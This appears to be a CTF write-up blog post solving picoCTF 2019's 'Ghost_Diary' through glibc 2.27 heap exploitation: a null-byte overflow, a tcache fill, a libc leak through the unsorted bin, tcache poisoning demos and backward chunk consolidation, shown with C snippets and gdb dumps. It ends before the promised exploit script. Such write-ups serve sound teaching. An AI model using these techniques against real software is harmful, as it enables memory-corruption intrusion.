---
layout: post
title:  "picoCTF 2019: Ghost_Diary (Glibc-2.27 Heap Exploitation)"
date:   2019-10-12 00:00:00 +0800
categories: pwn
tags: picoCTF-2019
---

I wasn't initially planning on playing picoCTF 2019, as the challenges are generally extremely easy. Imagine my surprise when someone from OpenToAll messaged me asking for a hint about this challenge. A heap exploitation challenge on picoCTF? With only a single null byte overflow vulnerability? ***AND*** with the tcache enabled? Count me in.

### **Challenge**

* **Category:** pwn
* **Points:** 500
* **Solves:** 15

>Try writing in this [ghost diary](https://2019shell1.picoctf.com/static/2136859eaddb15400ec3328f017e1df8/ghostdiary). Its also found in /problems/ghost-diary_4_f7e6ee76ec07e6866ddc813917b94545 on the shell server.

### **Solution**

Before you read this writeup, I would highly suggest having some prior knowledge about how the heap works on linux. Linux uses an allocator called `ptmalloc2`, and here are some great resources to get you started:

* [ctf-wiki: Extremely detailed information (in Chinese). This one is my favorite, use google translate](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/introduction-zh/)
* [sploitfun: Overview of ptmalloc2](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)
* [dhavalkapil: Overview + some exploits](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/malloc_chunk.html)
* [how2heap: Exploits from shellphish](https://github.com/shellphish/how2heap)
* [InfoSectBR: Some more writeups for some heap exploitation attacks](http://blog.infosectcbr.com.au/)

I will provide a brief overview of the heap further down, but I will still skip a lot of information and assume that the reader will be using these references to fully understand everything I say.

#### **Reversing the binary**

Let's start off by reverse engineering the binary. I first set up an Ubuntu Bionic VM, as that is the environment that the challenge server runs on.

Running `checksec` and `file` on it shows us the following:
```sh
vagrant@ubuntu-bionic:/ctf/pwn-and-rev/picoctf-2019/ghost_diary$ file ghostdiary
ghostdiary: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=da28ccb1f0dd0767b00267e07886470347987ce2, stripped

vagrant@ubuntu-bionic:/ctf/pwn-and-rev/picoctf-2019/ghost_diary$ checksec ghostdiary
[*] '/ctf/pwn-and-rev/picoctf-2019/ghost_diary/ghostdiary'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

So, we have a stripped, dynamically linked 64-bit binary here with all protections enabled. An explanation for each protection is given below:

* **Full RELRO**: The Global Offset Table (GOT) is read-only, meaning we won't be able to overwrite a function pointer there and hijack flow of execution easily.
* **Canary found**: There is a stack canary, so stack buffer overflows are out of the question unless we can somehow leak the canary.
* **NX enabled**: There is no memory region that is both writable and executable, meaning we can't inject shellcode into the program and have it execute the shellcode.
* **PIE enabled**: PIE stands for Position Independent Executable. It means that the base address of the binary is randomized each time we run it, meaning we can't use exploits such as ROP or ret2libc since we don't know any addresses at all without a leak.

So off the get go we can already see that this won't be an easy challenge. Fortunately for us, heap exploits don't care about any of these protections (most of the time at least).

The binary itself is very simple. You should be able to reverse engineer it yourself pretty easily. Note that any code shown below is my interpretation of the assembly code that I've gotten after disassembling the binary.

There is a global array of "pages" that can store 19 pages. Each page is a struct that contains a pointer to the page's content on the heap, as well as the size of the content. The struct looks something like the following:
```c
struct page
{
	char* content; // The actual content of the page
	int size; // The size of the content
};

struct page array_of_pages[19]; // Maximum of 19 pages allowed
```

We also have the following functionality:

* `sub_B5D` is the "New page in diary" function. You are allowed to add either a one-sided page or a two-sided page. If you choose a one-sided page, you can allocate a chunk <= 0xf0 in size. If you choose a two-sided page, you can allocate a chunk in between 0x110 and 0x1e0 (inclusive). There is a limit of 19 pages imposed.
* `sub_CFB` is the "Talk with ghost" function. It lets you edit a page and put your own content into it. This function calls `sub_DA2` to read in user input for the content. `sub_DA2` has a single null byte overflow vulnerability in it.
* `sub_DBE` is the "Listen to ghost" function. It outputs the contents of a page.
* `sub_E69` is the "Burn the page" function. It frees a page and nulls out the pointer in the global array of pages, hence no use-after-free.

The only vulnerability we have is a single null byte overflow in `sub_DA2`. The "Talk with ghost" (`sub_CFB`) function does something like the following:
```c
void talkWithGhost()
{
	int page_index;

	printf("Page: ");
	scanf("%d", &page_index);

	printf("Content: ");

	if (page_index <= 19 && global_pages_array[page_index] != NULL)
	{
		// Call sub_DA2 to read in the user's input
		sub_DA2(global_pages_array[page_index].content, global_pages_array[page_index].size);
	}
}
```

`sub_DA2` does something like the following:
```c
void sub_DA2(char *chunk_ptr, int size)
{
	int num_of_bytes_read = 0, index_to_write_to = 0;
	char buf;

	if (size) // Ensure size isn't just 0
	{
		while (num_of_bytes_read != size) // Read until size is hit, no heap overflow here
		{
			if (read(0, &buf, 1) != 1) // Read a single byte each time
			{
				puts("read error");
				exit(-1);
			}

			if (buf == '\n') // Quit if the byte read in is a newline
				break;

			// Write to the current index and increment the num_of_bytes_read
			index_to_write_to = num_of_bytes_read++;
			chunk_ptr[index_to_write_to] = buf;
		}
		chunk_ptr[num_of_bytes_read] = 0; // Null byte overflow here when setting the final byte to '\0'
	}
}
```

The vulnerability is obvious now. If we read the maximum amount of bytes possible, then we will have a single null byte overflow that will overflow into (possibly) the metadata of the next chunk. How do we use this to our advantage?

You may immediately have an *idea* as to how this vulnerability could be used exploited, but it definitely requires a very in-depth knowledge of the heap to know exactly how to exploit it. I'll take a quick detour now and provide a brief overview of ptmalloc2, the heap in glibc, and its internals now. Experienced readers can skip this part and go straight to the "Exploitation" section.

I will also skip explaining any information that isn't required for this challenge, such as the concept of arenas amongst other things.

It will be assumed that the reader has prior knowledge of how stack buffer overflows work. I will use the following link for reference:

* [Understanding the glibc malloc](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)

### **Overview of the glibc heap**

#### What is the heap?

The heap is, simply put, a memory region allotted to every program. This memory region can be dynamically allocated, meaning that a program can **request** and **release** memory from the heap whenever it requires. The heap is also a global memory space, meaning it isn't localized to a function like the stack is. This is mainly accomplished through the use of pointers to reference heap allocations.


#### How does a program request and release memory from the heap?

* **malloc**

>A program may use `malloc(size_t n)` (and all its different versions such as `calloc` and `realloc`) to request a chunk of at least `n` bytes, or `NULL` if no space is available. If `n` is zero, malloc returns a minimum-sized chunk (0x10 bytes on most 32-bit systems, and either 0x18 or 0x20 bytes on 64-bit systems). In most systems, `size_t` is an unsigned type, so negative values of `n` will be interpreted as a request for a huge amount of space, which will often fail.

* **free**

>A program may use `free(void *p)` to release the chunk of memory pointed to by `p`. This has no effect if `p` is `NULL`. It can have very bad effects if `p` has already been freed, or if `p` is not a malloc'd chunk at all.

#### What does a chunk look like in memory?

A chunk in memory can either be free, or in-use. Chunks are stored in so-called "arenas". Each thread gets its own "arena" of chunks, and there is a special arena called the "main arena" which is the very first arena created by a program. This is also the only arena present in single-threaded programs.

A structure called the `malloc_chunk` (a pointer to which is typedef'd as `mchunkptr`) is used by glibc to keep track of chunks, as follows:
```c
struct malloc_chunk {
  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */

  /* double links -- used only if free. */
  struct malloc_chunk* fd;
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  /* double links -- used only if free. */
  struct malloc_chunk* fd_nextsize;
  struct malloc_chunk* bk_nextsize;
};

typedef struct malloc_chunk* mchunkptr;
```

**Allocated Chunk Visual Structure**:
```
chunk-----> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|M|P|
mem-------> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             (size of chunk, but used for application data)    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|1|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Free Chunk Visual Structure**:
```
chunk-----> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|0|P|
mem-------> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Forward pointer to next chunk in list (fd)        |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Back pointer to previous chunk in list (bk)       |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space (may be 0 bytes long)                .
            .                                                               .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of current chunk, in bytes                   |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|0|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

Free chunks will (depending on their size and glibc version) either maintain themselves in a circular doubly linked list, or a single linked list. As you can see above, the size of a chunk has three bits at the end labeled `A`, `M`, and `P`. These are important:

* **A (NON_MAIN_ARENA)**: 0 for chunks in the main arena. Each thread spawned in a program receives its own arena, and for any chunks malloc'd in each of those threads, this bit is set to 1. The main arena is the arena that is always there prior to any new threads having been spawned in.

* **M (IS_MMAPPED)**: The chunk has been obtained through `mmap`. The other two bits are correspondingly ignored if this bit is set to 1, because `mmapped` chunks are neither in an arena, nor adjacent to any other free chunks.

* **P (PREV_INUSE)**: Set to 0 when the previous chunk (not the chunk before it in its free-list, but the one before it in memory) is free. The size of that previous free chunk is stored before the size of this current chunk ***only if*** the previous chunk is free, otherwise the previous chunk can use that `prev_size` space as if it was its own. The very first allocated chunk will always have this bit set. If this bit is set to 1, we cannot determine the previous chunk's size.

The most important thing to note here is that freed chunks remain on the heap. They aren't magically moved out of the heap into some other memory region. They make use of the forward and back pointers to track themselves in the free-lists (called `bins`) This means that given a vulnerability such as a heap overflow or a use-after-free (UAF), we can overwrite those forward and back pointers and thus corrupt the free lists. This can be used to our advantage, and if done carefully, can lead to code execution.

The other thing to note is that with something like a double free vulnerability, a freed chunk's forward pointer would point to itself. We can also utilize this to our advantage, and we will do so in the exploit for this challenge.

#### Bins and Chunks

A `bin` is glibc's term for a free-list. It is a singly or doubly linked list of free chunks. Whether it is singly linked or doubly linked depends on the size of the chunks being stored. Bins are differentiated based on the size of chunks that they contain. We have the following 5 bins in glibc 2.27:

1. **Tcache bin** (added with glibc 2.26) for any chunks <= 0x408 bytes in size. It is singly linked. Each tcache bin stores chunks of the same size. Each tcache bin has a max limit of 7 chunks that it can store.
2. **Fast bin** (not covered in this post, assumed knowledge) for any chunks <= 0x60 bytes in size. There are 10 fast bins, each singly linked.
3. **Unsorted bin**. Small and large chunks end up in this bin initially when freed. It essentially acts as a cache layer to speed up allocation and deallocation requests. There is only 1 unsorted bin and it is doubly linked.
4. **Small bin** (not covered in this post, assumed knowledge) for any chunks <= 0x200 bytes in size. Yes, the small bins overlap with the fast bins due to the fact that the fast bins have an upper limit to how many chunks they can store. Small bins are doubly linked.
5. **Large bin** (not covered in this post, assumed knowledge) for any chunks larger than the upper small chunk limit of 0x200 bytes. Large bins are doubly linked.

For information regarding the three bins that are not covered, see [this](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bins_chunks.html).

There is also a special chunk called the "top chunk". This is the chunk that borders the top of an arena. While servicing any allocation requests, it us used as the last resort (i.e space is taken out of the top chunk to service the allocation request). It can also grow using the `sbrk` system call. The `PREV_INUSE` bit is always set for the top chunk.

When chunks are allocated, there is usually an extra 0x08 or 0x10 bytes added to the size to store the metadata for the chunk. The metadata includes the `prev_size` and `size` fields of the chunk.

When a chunk is freed, if the chunk ends up in a bin that is ***not*** a fast bin nor a tcache bin, then the chunk that comes after it in memory will have its `PREV_INUSE` bit set to 0. If it does end up in a tcache bin or a fast bin, the next chunk's `PREV_INUSE` bit does not get set to 0.

#### Introduction to Tcache

I will be referring to the source code of `malloc.c` from glibc 2.27, found [here](https://ftp.gnu.org/gnu/glibc/glibc-2.27.tar.bz2).

Two new data structures were added in glibc 2.26 as shown below:
```c
/* Used to maintain a single free chunk in a tcache bin */
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;

/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS]; // TCACHE_MAX_BINS = 64
} tcache_perthread_struct;

static __thread char tcache_shutting_down = 0;

/* Used to maintain all free chunks that belong to this current thread's tcache bin.
 * This is stored at the very start of the heap, as soon as the first chunk gets malloc'd in a program
 */
static __thread tcache_perthread_struct *tcache = NULL;
```

To support allocation and deallocation for tcache chunks, two new functions were also added in glibc 2.26:
```c
/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  */
static void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}
```

* `tcache_get` is similar to `__int_malloc`, which returns an available chunk to the application. This chunk will come out of the tcache bin.

* `tcache_put` is similar to `__int_free`, which puts the chunk currently being freed into the tcache bin.

* The tcache bin is a singly linked list of free chunks. It follows a LIFO structure. There are tcache bins created for each chunk size (0x20, 0x30, 0x40, ...), and each tcache bin has a maximum of 7 chunks that it can store.

* As is also evident from the comments above the two functions above, there are zero security checks performed when freeing or mallocing out of a tcache bin. This, coupled with the fact that a tcache bin of a specific size has a max limit of 7 chunks, is very important to us. Every other bin has security checks to ensure the integrity of itself as well as the chunks it stores, but the tcache does not.

* Each thread has 64 tcache bins, each holding chunks of the same size. The maximum size chunk that the final tcache bin will hold (on 64-bit systems) is 0x408 bytes.

* If there is a chunk in a tcache bin and a request is made for a chunk of the same size, then the tcache bin takes priority over all other bins (i.e if there is a chunk of the same size in any of the other bins, they are ignored as the tcache bin is given priority). All bins in general take priority over the top chunk.

* If a chunk is freed and inserted into a tcache bin, the chunk immediately after this freed chunk (in memory) does ***not*** have its `PREV_INUSE` bit set to 0.

* If two adjacent chunks are freed and put into a tcache bin, these chunks do not consolidate together (i.e `malloc_consolidate` is never called for tcache chunks).

#### The Unsorted Bin

The unsorted bin is an optimizing cache layer that got added based on two simple observations. Those being that frees are often clustered together, and that frees are often immediately followed by allocations of similarly sized chunks. In these cases, merges of these freed chunks before putting the resulting larger chunk away in the correct bin would avoid some overhead, and being able to fast-return a recently freed allocation would similarly speed up the whole process.

Whenever a small or a large chunk is freed, they will initially be inserted into the unsorted bin. In glibc versions 2.26+, the only constraint is that if a small chunk is freed, the corresponding sized tcache bin must be full, otherwise the chunk will just end up in that tcache bin.

The reason the unsorted bin is important to us is because as soon as a chunk goes into the unsorted bin, a pointer to the unsorted bin (which exists within libc) is inserted into the forward and back pointers of that free chunk.

We can easily cause this by first filling up a tcache bin of a small size (i.e <= 0x200 bytes in size) with 7 chunks, then freeing a chunk of that same size one more time. This 8th and final free will cause the chunk to go into the unsorted bin due to the tcache bin being full. If you then have a UAF vulnerability, you can read this libc pointer and get an info leak, which lets you defeat both PIE and ASLR. An example is given below.

If you want to demo the code below, you must use either glibc version 2.26 or 2.27:
```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
	unsigned long *chunks[8];

	// Allocate 8 chunks of size 0x80
	for (int i = 0; i < 8; i++)
	{
		chunks[i] = malloc(0x80);
	}

	// Allocate one more chunk to prevent the unsorted bin chunk from being consolidated
	// with the top chunk after it's freed
	malloc(0x80);

	// Free 7 of them to fill up the 0x80 sized tcache bin
	for (int i = 0; i < 7; i++)
	{
		free(chunks[i]);
	}

	// The next free will go into the unsorted bin as the tcache bin is full
	free(chunks[7]);

	// Print out the forward pointer of the last freed chunk by emulating a UAF vulnerability
	// This will point into libc
	printf("0x%lx\n", *chunks[7]);
}
```
```sh
vagrant@ubuntu-bionic:/ctf/pwn-and-rev/picoctf-2019/ghost_diary$ gcc unsortedbin.c
vagrant@ubuntu-bionic:/ctf/pwn-and-rev/picoctf-2019/ghost_diary$ ./a.out
0x7f333f8f6ca0
```

This is very important. If we can somehow read this pointer (using a use-after-free, or overlapped chunks, by any means), then we have an information leak that we can use to find the base address of libc. This defeats both PIE and ASLR in one shot. This characteristic of the unsorted bin is used in the exploit for this challenge.

#### The Tcache Poisoning Attack

Given a double free vulnerability, we can get `malloc` to return an arbitrary pointer which lets us have an arbitrary read/write primitive. It abuses the fact that a double free will cause two of the same chunk to be inserted into the tcache bin, meaning that this chunk will have its `fd` pointer pointing to itself.

This is shown below, as well as utilized in our exploit. Credits to shellphish's [how2heap](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c) for part of the code:
```c
#include <stdio.h>
#include <stdlib.h>

int *arbitrary_pointer = NULL;

int main()
{
    int *our_pointer = NULL;

    fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n\n");
    fprintf(stderr, "We want a chunk on top of the global variable arbitrary_pointer at %p\n\n", &arbitrary_pointer);

    fprintf(stderr, "Allocating buffer.\n");
    int *a = malloc(8);

    fprintf(stderr, "malloc(8): %p\n", a);
    fprintf(stderr, "Freeing twice...\n");
    free(a);
    free(a);

    fprintf(stderr, "Now the free list has [ %p, %p ].\n\n", a, a);

    fprintf(stderr, "Next we allocate one of the chunks\n\n");
    a = malloc(8);

    fprintf(stderr, "Now the free list has [ %p ].\n", a);
    fprintf(stderr, "Now we overwrite a's fd pointer to the address of arbitrary_pointer\n");
    a[0] = (unsigned long long) &arbitrary_pointer;

    fprintf(stderr, "And now, the free list has [ %p %p ].\n\n", a, &arbitrary_pointer);
    fprintf(stderr, "Two more mallocs, and the second malloc gives us a chunk right on top of arbitrary_pointer\n\n");

    malloc(8);
    our_pointer = malloc(8);

    fprintf(stderr, "arbitrary_pointer: %p, our_pointer: %p\n", &arbitrary_pointer, our_pointer);

    return 0;
}

```
```
vagrant@ubuntu-bionic:/ctf/pwn-and-rev/picoctf-2019/ghost_diary$ gcc a.c
vagrant@ubuntu-bionic:/ctf/pwn-and-rev/picoctf-2019/ghost_diary$ ./a.out
This file demonstrates a simple double-free attack with tcache.

We want a chunk on top of the global variable arbitrary_pointer at 0x555e1efe1030

Allocating buffer.
malloc(8): 0x555e20bac260
Freeing twice...
Now the free list has [ 0x555e20bac260, 0x555e20bac260 ].

Next we allocate one of the chunks

Now the free list has [ 0x555e20bac260 ].
Now we overwrite a's fd pointer to the address of arbitrary_pointer
And now, the free list has [ 0x555e20bac260 0x555e1efe1030 ].

Two more mallocs, and the second malloc gives us a chunk right on top of arbitrary_pointer

arbitrary_pointer: 0x555e1efe1030, our_pointer: 0x555e1efe1030
```

#### **Exploitation**

Now, hopefully I've explained everything clearly enough for everyone to be able to follow through with the writeup. If I haven't, please do consider spending a little bit more time skim-reading through the links I've provided above. I will try to explain the exploitation steps as clearly and as concisely as possible.

The challenge itself took me about 3.5 hours to figure out. The exploitation steps I used are laid out below. Please follow my exploit script (shown at the end) alongside each step to help visualise the heap at each step:

#### Step 1: **The setup**

* Set up three chunks that we will use for our exploit. These chunks will be A, B, and C respectively. A's size will be 0x128 (0x131 in memory due to metadata, `PREV_INUSE` bit set to 1), while B and C's sizes will be 0x118 (0x121 in memory due to metadata, `PREV_INUSE` bits set to 1).

* The idea is that we want to use the single NULL byte overflow to set C's `PREV_INUSE` bit to 0, meaning we change C's size from 0x131 to 0x100. As we do that, we also want to set C's `prev_size` field to 0x250. More information about that is given below.

* The chunks are shown in gdb as follows:

```c
gef➤  x/200gx 0x000055a7bc254000
...
0x55a7bc254250: 0x0000000000000000      0x0000000000000131 <- chunk A
0x55a7bc254260: 0x0000000000000000      0x0000000000000000
...
0x55a7bc254380: 0x0000000000000000      0x0000000000000121 <- chunk B
0x55a7bc254390: 0x0000000000000000      0x0000000000000000
...
0x55a7bc2544a0: 0x0000000000000000      0x0000000000000121 <- chunk C
```

#### Step 2: **Prepare the tcache bins**

* Completely fill up the 0xf0 sized tcache bin (Which would store the freed chunk C ***after*** its size is overwritten to 0x100) and 0x128 sized tcache bin (which would otherwise store chunk A when we free it).

```c
gef➤  heap bins tcache

// Counts set to 7 meaning both tcache bins are full
Tcachebins[idx=14, size=0xf0] count=7  ←  Chunk(addr=0x55a7bc254bd0, size=0x100, flags=PREV_INUSE)  ←  Chunk(addr=0x55a7bc254ad0, size=0x100, flags=PREV_INUSE)  ←  ...

Tcachebins[idx=17, size=0x120] count=7  ←  Chunk(addr=0x55a7bc2553f0, size=0x130, flags=PREV_INUSE)  ←  Chunk(addr=0x55a7bc2552c0, size=0x130, flags=PREV_INUSE)  ←  ...
```

* We don't want either of the chunks A or C to go into the tcache bins, as there is no consolidation in the tcache bins. The exploit relies on the fact that chunk C will coalesce backwards with chunks A and B provided we set up the heap correctly.

#### Step 3: **Prepare chunk A for consolidation later on**

* Free chunk A. This sends chunk A into the unsorted bin (as the 0x128 sized tcache bin is full), meaning a libc pointer pointing to the `main_arena` is placed into chunk A's `fd` and `bk` pointers, as shown below:

```c
gef➤  x/40gx 0x000055a7bc254250                          
0x55a7bc254250: 0x0000000000000000      0x0000000000000131 <- chunk A
0x55a7bc254260: 0x00007f7e28fbeca0      0x00007f7e28fbeca0 <- libc pointers into the main_arena unsorted bin
0x55a7bc254270: 0x0000000000000000      0x0000000000000000
...
```

* We do this free here in order to get some valid pointers inserted into A's `fd` and `bk` fields. This is important later because when we free chunk C and have it consolidate backwards with chunks A and B, there are some security checks that will ensure that chunk A's `fd` and `bk` pointers are valid. More information will be given below when chunk C is being freed.

* Using gdb, we can calculate the difference between the leaked pointers and the libc base now. This offset remains constant every time we run the program. This offset is found to be `0x3ebca0`.

#### Step 4: **Abuse the vulnerability**

* Edit chunk B's contents to cause a NULL byte overflow into chunk C's size. This changes chunk C's total size (including metadata) from 0x121 to 0x100. Notice that the `PREV_INUSE` bit gets set to 0 in the process, due to the NULL byte overflow, which causes the chunk that is `prev_size` bytes before C to appear to be free when we free chunk C later on.

* In the process of doing the NULL byte overflow, we also set chunk C's `prev_size` field to 0x250. This causes the `prev_size` field to encompass both chunks A and B. Later when we free chunk C, the `unlink` macro is called using chunk A ***because*** of the fact that we set chunk C's `prev_size` such that it encompasses up to chunk A. This causes chunks A, B, and C to be consolidated into one large chunk, which is then put into the unsorted bin.

* The code for the unlink macro will be shown a bit further down.

```c
gef➤  x/80gx 0x55a7bc254380
0x55a7bc254380: 0x0000000000000130      0x0000000000000120 <- chunk B
0x55a7bc254390: 0x4242424242424242      0x4242424242424242
...
0x55a7bc254480: 0x4242424242424242      0x4242424242424242
0x55a7bc254490: 0x4242424242424242      0x4242424242424242
0x55a7bc2544a0: 0x0000000000000250      0x0000000000000100 <- prev_size 0x250 followed by chunk C size overwritten
0x55a7bc2544b0: 0x0000000000000000      0x0000000000000000
0x55a7bc2544c0: 0x0000000000000000      0x0000000000000000
```

* The most important aspect of this is that we ***still*** have a pointer to chunk B.

#### Step 5: **Setup chunk C for the unsorted bin**

* Since chunk C's size has changed from 0x121 to 0x100, we must create a fake chunk within chunk C. We need to do this now because freeing chunk C will insert it into the unsorted bin as the 0xf0 tcache bin is full (remember that the 0x100 size includes metadata, so the chunk really has a size of 0xf0 without the metadata).

```c
gef➤  x/50gx 0x55a7bc2544a0
0x55a7bc2544a0: 0x0000000000000250      0x0000000000000100 <- chunk C
0x55a7bc2544b0: 0x4343434343434343      0x4343434343434343
...
0x55a7bc254590: 0x4343434343434343      0x4343434343434343
0x55a7bc2545a0: 0x4343434343434343      0x0000000000000021 <- fake chunk inserted to bypass security checks
0x55a7bc2545b0: 0x0000000000000000      0x0000000000000000
0x55a7bc2545c0: 0x0000000000000000      0x0000000000000101 <- actual next chunk after C
0x55a7bc2545d0: 0x0000000000000000      0x0000000000000000
```

* When the chunk is put into the unsorted bin, there are some security checks that we must bypass, and this fake chunk helps with that. More details below.

#### Step 6: **Free chunk C, causing the backwards consolidation**

* Now, after all this preparation, we free chunk C. This calls `_int_free()`. First, the tcache bin 0xf0 is checked to see if there is space in it, but it's already full, so chunk C is then placed into the unsorted bin.

* While this is done, chunk C's size is checked, and it is seen to be 0x100. `_int_free()` will then check for a chunk 0x100 bytes after chunk C to ensure that that chunk's `PREV_INUSE` bit is set to 1. If it is not, then `_int_free()` will error out saying `"double free or corruption (!prev)"`, since chunk C will appear to be free if the next chunk's `PREV_INUSE` bit is not set to 1.  

* Since we changed chunk C's size from 0x121 to 0x100, there isn't a chunk 0x100 bytes after chunk C, which is why we place a chunk there ourselves with its `PREV_INUSE` bit set to 1. This check is documented [here](https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4279):

```c
/* Or whether the block is actually not marked used.  */
if (__glibc_unlikely (!prev_inuse(nextchunk)))
	malloc_printerr ("double free or corruption (!prev)");
```

* Next, the `PREV_INUSE` bit of chunk C is checked. Since it has been set to 0 by us, the chunk is consolidated backwards using the `prev_size` field value. This consolidation backwards will call the `unlink` macro, which has a bunch of security checks. The consolidation is shown [here](https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4290):

```c
/* consolidate backward */
if (!prev_inuse(p)) {
	prevsize = prev_size (p);
	size += prevsize;
	p = chunk_at_offset(p, -((long) prevsize));
	unlink(av, p, bck, fwd);
}
```

* Now, remember when we freed chunk A initially? I said the reason behind it was so that chunk A's `fd` and `bk` fields get filled with valid pointers. From the code snippet above, you can see that when `_int_free()` attempts to perform backwards consolidating, it will call the `unlink` macro with chunk A as its second parameter. Within the unlink macro (the code for which can be found [here](https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L1403)), we can see following code along with its extensive security checks:

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");			      \
    FD = P->fd;								      \
    BK = P->bk;								      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
      malloc_printerr ("corrupted double-linked list");			      \
    else {								      \
        FD->bk = BK;							      \
        BK->fd = FD;							      \
        if (!in_smallbin_range (chunksize_nomask (P))			      \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {		      \
	    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)	      \
		|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
	      malloc_printerr ("corrupted double-linked list (not small)");   \
            if (FD->fd_nextsize == NULL) {				      \
                if (P->fd_nextsize == P)				      \
                  FD->fd_nextsize = FD->bk_nextsize = FD;		      \
                else {							      \
                    FD->fd_nextsize = P->fd_nextsize;			      \
                    FD->bk_nextsize = P->bk_nextsize;			      \
                    P->fd_nextsize->bk_nextsize = FD;			      \
                    P->bk_nextsize->fd_nextsize = FD;			      \
                  }							      \
              } else {							      \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      \
              }								      \
          }								      \
      }									      \
}
```

* It is evident that the line `if (__builtin_expect (FD->bk != P || BK->fd != P, 0))` will use the two pointers from chunk A's `fd` and `bk` fields to perform some security checks. If we didn't free chunk A initially, those pointers would be `NULL`, and this check here would attempt to dereference these `NULL` pointers, and thus seg fault immediately. Freeing chunk A initially prevents that as well as lets us get past these security checks.

* Finally, this entire consolidated chunk (size 0x350) is placed into the unsorted bin, and its `fd` and `bk` pointers are set to point into the unsorted bin in the `main_arena` which is in libc. This entire chunk essentially is placed right on top of chunks A, B, and C:

```c
gef➤  heap bin unsorted

[+] unsorted_bins[0]: fw=0x55a7bc254250, bk=0x55a7bc254250
 →   Chunk(addr=0x55a7bc254260, size=0x350, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.

gef➤  x/150gx 0x55a7bc254250
0x55a7bc254250: 0x0000000000000000      0x0000000000000351 <- consolidated chunk A
0x55a7bc254260: 0x00007f7e28fbeca0      0x00007f7e28fbeca0 <- libc pointers
...
0x55a7bc254370: 0x0000000000000000      0x0000000000000000
